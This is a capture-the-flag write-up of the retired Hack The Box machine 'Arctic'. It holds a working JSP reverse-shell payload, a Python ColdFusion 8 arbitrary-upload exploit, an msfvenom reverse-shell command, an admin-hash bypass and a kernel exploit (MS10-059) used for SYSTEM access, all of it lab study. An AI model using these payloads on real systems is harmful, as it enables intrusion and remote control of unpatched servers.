# Arctic (Retired)

Retired at the time of attempt. 

Sources of information 

* [ippsec](https://www.youtube.com/watch?v=e9lVyFH7-4o&abab)
* [Rana Khalil](https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/windows-boxes/arctic-writeup-w-o-metasploit)
* [0xdf](https://0xdf.gitlab.io/2020/05/19/htb-arctic.html)



## Recon 
### nmap
```bash
sudo nmap -sC -sV -p- -oA nmap/arctic 10.10.10.11
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-25 22:54 GMT
Nmap scan report for 10.10.10.11
Host is up (0.030s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Port 8500 

NMAP indicates its running FMTP - Flight Message Transfer Protocol, which is a protocol used for flight data, which is very unlikely in a CTF.

Navigating to the port in a browser shows that it contains files and directories associated with Adobe ColdFusion, but its cripplingly slow (30 Seconds per request).  



![image-20210409185600087](/home/boolean/.config/Typora/typora-user-images/image-20210409185600087.png)



#### Ports 135 & 49154

Microsoft RPC



## Exploit (Metasploit) - User



Within the CFIDE we find a subdirectory Administrator, which when clicked sends redirects to an Adobe ColdFusion 



![image-20210409185913583](/home/boolean/.config/Typora/typora-user-images/image-20210409185913583.png)

A searchsploit query for ColdFusion shows a few exploits, most being XSS but one has an File Upload / Execution metasploit module. Running this will give a very quick reverse shell, IF it ran as expected. However there is an error, if the exploit is ran through burp using a proxy we can intercept the exploit. This method was demoed in the Ippsec video.

```http
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/YU.jsp%00 HTTP/1.1
Host: 127.0.0.1:8500
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: multipart/form-data; boundary=_Part_974_542664965_2886893833
Content-Length: 1586
Connection: close

--_Part_974_542664965_2886893833
Content-Disposition: form-data; name="newfile"; filename="AJPDNDNU.txt"
Content-Type: application/x-java-archive

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream mk;
    OutputStream lm;

    StreamConnector( InputStream mk, OutputStream lm )
    {
      this.mk = mk;
      this.lm = lm;
    }

    public void run()
    {
      BufferedReader so  = null;
      BufferedWriter rke = null;
      try
      {
        so  = new BufferedReader( new InputStreamReader( this.mk ) );
        rke = new BufferedWriter( new OutputStreamWriter( this.lm ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = so.read( buffer, 0, buffer.length ) ) > 0 )
        {
          rke.write( buffer, 0, length );
          rke.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( so != null )
          so.close();
        if( rke != null )
          rke.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath = "cmd.exe";
    Socket socket = new Socket( "10.10.14.12", 9001 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

--_Part_974_542664965_2886893833--
```

Then navigating to the file in the above payload will trigger the reverse shell within the jsp. In this case YU.jsp

```http
http://127.0.0.1:8500/userfiles/file/YU.jsp
```



This gets us a shell as User

```bash
(boolean㉿kalibox)[~/htb/arctic-pwnd]$ nc -lvnp 9001                                                                                                                                                             1 ⨯
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.11] 49491
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>
```



## Exploit 14641 (Manual) User

Using exploit [14641](https://www.exploit-db.com/exploits/14641) we can attempt to get the password for the administrator. However, it is encrypted.

![image-20210409203157028](/home/boolean/.config/Typora/typora-user-images/image-20210409203157028.png)

The problem is that the password is hashed and I do not know the encryption method. Using view source we can copy and paste the password for cracking later. 

```bash
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
```

Also in the source we can see some information about the encryption methods used to create the above hash

```html
<form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));" >
```

This tells us that the password is hashed using a SHA1, done on the client side. The password is then HMAC'd using a salt value, taken from the salt parameter, also on the client side

```html
<input name="salt" type="hidden" value="1618454713121">
```

Using the developer tools, paste the following command into the console to calculate the cfadminPassword value

```javascript
console.log(hex_hmac_sha1(document.loginform.salt.value, '2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03'));
```

This command is essentially what happens when you hit the login button, using the value gotten from the exploit, we calculated the HMAC of the password using the salt (which the website already knew). Note: This is time sensitive as the salt changes, the salt comes from the server side, combined with the 30 second delay that seems to built-in with this box. It becomes painful.

Once in the administrator console, navigate to the Mappings Section and take note of the default mappings of CFIDE, this is where the uploads will be going - in this case 

```powershell
C:\ColdFusion8\wwwroot\CFIDE
```

Now its time to schedule a task

![image-20210413202532488](/home/boolean/.config/Typora/typora-user-images/image-20210413202532488.png)

The payload was created using msfvenom and the following command :

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.24 LPORT=9002 -f raw > shell.jsp
```

To trigger the reverse shell click on the filename you created in the File field, and it will be located in 

```html
http://10.10.10.11:8500/CFIDE/boolean.jsp
```

Now we have a shell as use tolis and from here we can grab the user.txt file.

### Alternatively

The default file upload exploit does not work because of a change in file structure of the arctic machine, but a script was created by a htb user [Arrexel](https://forum.hackthebox.eu/discussion/116/python-coldfusion-8-0-1-arbitrary-file-upload)

```python
#!/usr/bin/python
# Exploit Title: ColdFusion 8.0.1 - Arbitrary File Upload
# Date: 2017-10-16
# Exploit Author: Alexander Reid
# Vendor Homepage: http://www.adobe.com/products/coldfusion-family.html
# Version: ColdFusion 8.0.1
# CVE: CVE-2009-2265 
# 
# Description: 
# A standalone proof of concept that demonstrates an arbitrary file upload vulnerability in ColdFusion 8.0.1
# Uploads the specified jsp file to the remote server.
#
# Usage: ./exploit.py <target ip> <target port> [/path/to/coldfusion] </path/to/payload.jsp>
# Example: ./exploit.py 127.0.0.1 8500 /home/arrexel/shell.jsp
import requests, sys

try:
    ip = sys.argv[1]
    port = sys.argv[2]
    if len(sys.argv) == 5:
        path = sys.argv[3]
        with open(sys.argv[4], 'r') as payload:
            body=payload.read()
    else:
        path = ""
        with open(sys.argv[3], 'r') as payload:
            body=payload.read()
except IndexError:
    print 'Usage: ./exploit.py <target ip/hostname> <target port> [/path/to/coldfusion] </path/to/payload.jsp>'
    print 'Example: ./exploit.py example.com 8500 /home/arrexel/shell.jsp'
    sys.exit(-1)

basepath = "http://" + ip + ":" + port + path

print 'Sending payload...'

try:
    req = requests.post(basepath + "/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/exploit.jsp%00", files={'newfile': ('exploit.txt', body, 'application/x-java-archive')}, timeout=30)
    if req.status_code == 200:
        print 'Successfully uploaded payload!\nFind it at ' + basepath + '/userfiles/file/exploit.jsp'
    else:
        print 'Failed to upload payload... ' + str(req.status_code) + ' ' + req.reason
except requests.Timeout:
    print 'Failed to upload payload... Request timed out'

```



## Privesc



### systeminfo

```powershell
C:\ColdFusion8\runtime\bin>systeminfo
systeminfo

Host Name:                 ARCTIC
OS Name:                   Microsoft Windows Server 2008 R2 Standard 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-507-9857321-84451
Original Install Date:     22/3/2017, 11:09:45 
System Boot Time:          15/4/2021, 5:33:18 
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.023 MB
Available Physical Memory: 162 MB
Virtual Memory: Max Size:  2.047 MB
Virtual Memory: Available: 976 MB
Virtual Memory: In Use:    1.071 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.11

C:\ColdFusion8\runtime\bin>
```

Things of note, this is a 2008 Windows Server without any hot-fixes, so in short very vulnerable. 

Using the windows exploit suggester shows several vulnerabilities 

```bash
(boolean㉿kalibox)[~/htb/arctic-pwnd/Windows-Exploit-Suggester]$ ./windows-exploit-suggester.py --database 2021-04-13-mssb.xls --systeminfo ../sysinfo
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

Since this is a manual approach the metasploit modules can be ignored, and the IE exploit will require user interaction this leaves with a short list of:

* MS10-047
* <mark> MS10-059 </mark>
* MS10-061
* MS10-073
* MS11-011
* MS13-005

Exploit Code from htb user egre55 is available on his [github](https://github.com/egre55/windows-kernel-exploits/tree/master/MS10-059:%20Chimichurri)

Using the impacket smbserver.py the executable was uploaded and copied over to arctic

```powershell
C:\ProgramData>net use \\10.10.14.24\share
net use \\10.10.14.24\share                                                                               
The command completed successfully.

C:\ProgramData>copy \\10.10.14.24\share\Chimichurri.exe .
copy \\10.10.14.24\share\Chimichurri.exe .        
        1 file(s) copied. 
```

Then it is a simple case of running the executable along with an ip and a port and it should return a shell as NT\Authority System

```powershell
C:\ProgramData>.\Chimichurri.exe 10.10.14.24 443                                                          
.\Chimichurri.exe 10.10.14.24 443                                                                                                                                                                                    
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>

```

Just make sure you have a netcat listener on the other end.



![image-20210413210034110](/home/boolean/.config/Typora/typora-user-images/image-20210413210034110.png)

